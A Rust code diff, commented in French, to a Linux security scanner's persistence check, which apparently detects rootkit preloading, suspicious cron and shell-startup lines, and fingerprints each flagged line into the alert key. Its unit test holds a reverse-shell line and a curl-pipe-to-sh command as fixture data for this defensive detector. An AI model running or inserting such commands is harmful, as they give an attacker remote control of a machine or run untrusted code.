@@ -205,6 +205,19 @@ pub(super) fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path:
     trouve
 }
 
+/// Une ligne signalée dans une clé : sa source et l'empreinte de son texte (jamais le texte, écrit par qui l'a posée).
+fn source_de(origine: &str, ligne: &str) -> String {
+    format!("{origine}#{}", crate::modele::id::trace(ligne))
+}
+
+/// L'objet de l'alerte des lancements : ses lignes signalées, triées et sans double (l'ordre de lecture ne compte
+/// pas, deux lignes identiques comptent une fois).
+fn objet_des_lancements(mut sources: Vec<String>) -> crate::modele::Objet {
+    sources.sort();
+    sources.dedup();
+    crate::modele::Objet::de("lancements", &sources.join(","))
+}
+
 /// Lancements automatiques détournés : bibliothèque préchargée dans tous les programmes, services et démarrage
 /// de session qui lancent un shell inversé ou un programme caché, services système ajoutés à la main.
 pub(super) fn persistance() -> Vec<Constat> {
@@ -213,6 +226,10 @@ pub(super) fn persistance() -> Vec<Constat> {
     let gestion = Paquets::detecter();
     let mut critiques = Vec::new();
     let mut suspects = Vec::new();
+    // D'où vient chaque ligne signalée et l'empreinte de son texte (`source_de`), sans langue ni numéro de ligne :
+    // l'objet de l'alerte, qui change dès qu'une autre ligne ou une autre source s'ajoute (accepter les lignes
+    // d'aujourd'hui ne tait jamais celles de demain, même dans un fichier déjà signalé).
+    let mut sources: Vec<String> = Vec::new();
 
     // /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris.
     // Technique classique des rootkits ; presque aucun système normal n'en a.
@@ -223,6 +240,7 @@ pub(super) fn persistance() -> Vec<Constat> {
             .flat_map(str::split_whitespace)
         {
             let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
+            sources.push(source_de("preload", lib));
             // Écrit par qui a posé le préchargement (un rootkit, souvent) : montré rendu inoffensif.
             let lib = crate::ui::affichable(lib);
             if connue {
@@ -240,6 +258,7 @@ pub(super) fn persistance() -> Vec<Constat> {
     }
     for var in ["LD_PRELOAD", "LD_AUDIT"] {
         if let Some(v) = std::env::var_os(var).filter(|v| !v.is_empty()) {
+            sources.push(source_de(&format!("env:{var}"), &v.to_string_lossy()));
             suspects.push(trf!(
                 "{var}={} est défini pour cette session",
                 "{var}={} is set for this session",
@@ -307,6 +326,7 @@ pub(super) fn persistance() -> Vec<Constat> {
         };
         for (n, l) in texte.lines().enumerate() {
             if definit_prechargement(l) {
+                sources.push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                 suspects.push(trf!(
                     "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                     "{}:{} preloads a library (LD_PRELOAD)",
@@ -317,6 +337,7 @@ pub(super) fn persistance() -> Vec<Constat> {
                 && !demarrage.contains(f)
                 && let Some(raison) = commande_suspecte(l, false)
             {
+                sources.push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                 suspects.push(trf!("{}:{} : {raison}", "{}:{}: {raison}", court(f, &h), n + 1));
             }
         }
@@ -327,6 +348,7 @@ pub(super) fn persistance() -> Vec<Constat> {
         };
         for (n, l) in texte.lines().enumerate() {
             if let Some(raison) = commande_lancee(l).and_then(|c| commande_suspecte(&c, true)) {
+                sources.push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                 suspects.push(trf!("{}:{} : {raison}", "{}:{}: {raison}", court(f, &h), n + 1));
             }
         }
@@ -352,6 +374,12 @@ pub(super) fn persistance() -> Vec<Constat> {
     }
     for (source, l) in cron.iter().filter(|(_, l)| !commentaire(l)) {
         if let Some(raison) = commande_suspecte(l, false) {
+            let origine = if source == "crontab" {
+                "crontab".to_string()
+            } else {
+                crate::modele::id::chemin(source)
+            };
+            sources.push(source_de(&origine, l));
             suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
         }
     }
@@ -386,7 +414,7 @@ pub(super) fn persistance() -> Vec<Constat> {
             let _ = trw!(message, " ; et {reste} autre(s)", "; and {reste} more");
         }
         message.push('.');
-        constats.push(alerte(CAT, niveau, message).manuel(
+        constats.push(alerte(CAT, niveau, message).avec_objet(objet_des_lancements(sources)).manuel(
             tr!("Ne rien lancer : lire chaque ligne signalée et supprimer celles que tu n'as pas ajoutées, puis lancer l'antivirus", "Do not run anything: read each reported line and delete the ones you did not add, then run the antivirus"),
             &[],
         ));
@@ -415,6 +443,7 @@ pub(super) fn persistance() -> Vec<Constat> {
                         maison.join(", ")
                     ),
                 )
+                .avec_objet(crate::modele::Objet::de("services", &maison.join(",")))
                 .manuel(
                     tr!(
                         "Si tu n'en reconnais pas un, lis ce qu'il lance avant de le désactiver",
@@ -662,6 +691,24 @@ pub(super) fn fichiers_suspects() -> Vec<Constat> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// Une seconde ligne suspecte dans un fichier déjà signalé change la clé (avant, seul le fichier y était) ;
+    /// l'ordre de lecture et une ligne lue deux fois, non.
+    #[test]
+    fn nouvelle_ligne_nouvelle_cle() {
+        let r1 = "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1";
+        let r2 = "curl -s http://exemple.invalid/x | sh";
+        let cle = |lignes: &[&str]| {
+            let sources = lignes.iter().map(|l| source_de("~/.bashrc", l)).collect();
+            crate::modele::Cle::de("LNX-PRS-002", &objet_des_lancements(sources)).unwrap()
+        };
+        assert_ne!(cle(&[r1]), cle(&[r1, r2]));
+        assert_eq!(cle(&[r1, r2]), cle(&[r2, r1, r2]));
+        assert_ne!(cle(&[r1]), cle(&[r2]));
+        // Les blancs du bord ne changent pas la ligne ; une autre source, si.
+        assert_eq!(source_de("crontab", r1), source_de("crontab", &format!("  {r1}\t")));
+        assert_ne!(source_de("crontab", r1), source_de("~/.bashrc", r1));
+    }
 
     #[test]
     fn chemins_avant_fusion_de_usr() {
